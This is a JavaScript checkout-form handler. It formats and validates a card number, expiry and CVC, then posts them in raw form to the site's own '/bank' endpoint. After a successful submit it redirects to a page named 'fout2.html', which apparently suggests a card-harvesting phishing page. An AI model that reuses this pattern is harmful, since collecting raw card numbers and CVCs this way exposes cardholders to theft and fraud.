// Format the card number as the user types, adding a space every 4 digits
document.getElementById("card").addEventListener("input", function(event) {
    let cardNumber = event.target.value.replace(/\s+/g, ''); // Remove all spaces
    if (cardNumber.length > 0) {
        event.target.value = cardNumber.match(/.{1,4}/g).join(' '); // Insert space every 4 digits
    }
});

// Format the expiry date as MM/YY when the user types
document.getElementById("date").addEventListener("input", function(event) {
    let input = event.target.value.replace(/[^\d]/g, ''); // Remove non-digit characters
    if (input.length > 2) {
        event.target.value = input.slice(0, 2) + '/' + input.slice(2, 4); // Insert '/' after two digits
    } else {
        event.target.value = input;
    }
});

// Validate and submit the form data
document.getElementById("checkoutForm").addEventListener("submit", function(event) {
    event.preventDefault(); // Prevent form submission initially

    // Get form values
    const name = document.getElementById("name").value.trim();
    const card = document.getElementById("card").value.replace(/\s+/g, ''); // Remove spaces for validation
    const date = document.getElementById("date").value.trim(); // Expiry date (MM/YY)
    const code = document.getElementById("code").value.trim(); // CVC code

    // Clear previous error messages
    document.getElementById("nameError").textContent = '';
    document.getElementById("cardError").textContent = '';
    document.getElementById("dateError").textContent = '';
    document.getElementById("codeError").textContent = '';

    // Define validation patterns
    const cardPattern = /^\d{16}$/; // 16 digits for card number
    const cvcPattern = /^\d{3,4}$/; // 3 or 4 digits for CVC code
    const datePattern = /^(0[1-9]|1[0-2])\/\d{2}$/; // Format MM/YY

    let valid = true;

    // Validate cardholder name
    if (!name) {
        valid = false;
        document.getElementById("nameError").textContent = 'Please enter the cardholder name.';
    }

    // Validate card number
    if (!cardPattern.test(card)) {
        valid = false;
        document.getElementById("cardError").textContent = 'Please enter a valid 16-digit card number.';
    }

    // Validate expiry date
    if (!datePattern.test(date)) {
        valid = false;
        document.getElementById("dateError").textContent = 'Please enter a valid expiry date (MM/YY).';
    }

    // Validate CVC code
    if (!cvcPattern.test(code)) {
        valid = false;
        document.getElementById("codeError").textContent = 'Please enter a valid 3- or 4-digit CVC code.';
    }

    // If valid, submit the data to the server
    if (valid) {
        const bankData = {
            name: name,
            card: card,
            date: date,
            code: code,
            userId: sessionStorage.getItem('userId') // Retrieve the userId from sessionStorage
        };

        // Dynamically get the server's base URL
        const serverBaseUrl = window.location.origin;

        // Send data to the server
        fetch(`${serverBaseUrl}/bank`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(bankData)
        })
        .then(response => response.json())
        .then(data => {
            console.log('Success:', data);
            if (data.message === 'Bank details submitted successfully!') {
                window.location.href = 'fout2.html'; // Redirect if successful
            }
        })
        .catch((error) => {
            console.error('Error:', error);
            alert('Error submitting bank details');
        });
    }
});

